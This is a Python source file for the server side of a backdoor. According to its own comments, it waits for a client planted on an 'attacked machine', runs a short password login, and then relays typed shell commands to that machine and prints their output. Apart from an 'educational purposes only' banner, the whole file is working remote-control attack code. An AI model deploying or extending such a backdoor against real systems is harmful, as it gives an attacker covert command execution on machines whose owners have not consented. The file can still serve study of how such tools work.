"""
#========================================#
# This is for educational purposes only, #
#     do not use against any person.     #
#           Be a good person             #
#========================================#

Server part of a baackdoor program.
This code must be executed on the machine with which we want to attack another machine.
When the code starts it listens until the client code also starts.
A login system has also been added to start using the attacked machine.
We want to be a little gentle.
You can interrupt the connection typing: logout
"""
import socket

HOST        = 'some.ip.addr'  # Ip of the machine where the code run
PORT        = 8022            # Port of the attacked device
CONNECT_TRY = 0               # Variable to count login attempts
MAX_TRY     = 3               # Max number of attempts
MSG_SIZE    = 2**11           # Size in bytes of the message recived from client

#==============================================================================
# Create socket connection and connect to the client
#==============================================================================

# A socket is a quick connection which allows the transmission of data between
# two processes on the same machine or different machines over a network
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.bind((HOST, PORT))
print('[>>>] Server Started')
print('[>>>] Listening For Client Connection ...')
server.listen(1)
client, client_addr = server.accept()
print(f'[>>>] {client_addr} Client connected to the server \n')

#==============================================================================
# Handle login on the client machine
#==============================================================================

# To start using the other machine you need to authenticate with a password
output = client.recv(MSG_SIZE).decode()
CONNECT_TRY = int(output[0])
print(f"{output[1:]}")

while True:

    # Only 3 attempts are possible
    if CONNECT_TRY < MAX_TRY:
        # LOGIN
        output = client.recv(MSG_SIZE).decode()
        print(f"{output}")

        # Insert the password
        command = input('[>>>] Enter password: ').encode()
        client.send(command)

        # The client code check the password and replies
        output = client.recv(MSG_SIZE).decode()

        if output == 'Connection done':
            break
        else :
            try :
                CONNECT_TRY = int(output[0])
                print(f"{output[1:]}")
            except ValueError:
                pass

    # If you get the password wrong MAX_TRY times,
    # the connection is interrupted and the server and client stop running.
    elif CONNECT_TRY >= MAX_TRY :
        output = client.recv(MSG_SIZE).decode()
        print(f"{output}")
        server.close()
        exit()

print("login was successful\n")

#==============================================================================
# Start of sending command on client machine
#==============================================================================

while True:

    # Send command
    command = input('[>>>] ')
    client.send(command.encode())
    print('[>>>] Command sent')

    # Stop condition that also stop the client code
    if command == 'logout' : break

    # Print the result of command. If command ha no ouput (e.g.: echo test > test.txt)
    # the code will print: Done to ensure that the command was executed
    output = client.recv(MSG_SIZE).decode()
    print(f"[out]:\n{output}")

# Close connection
server.close()
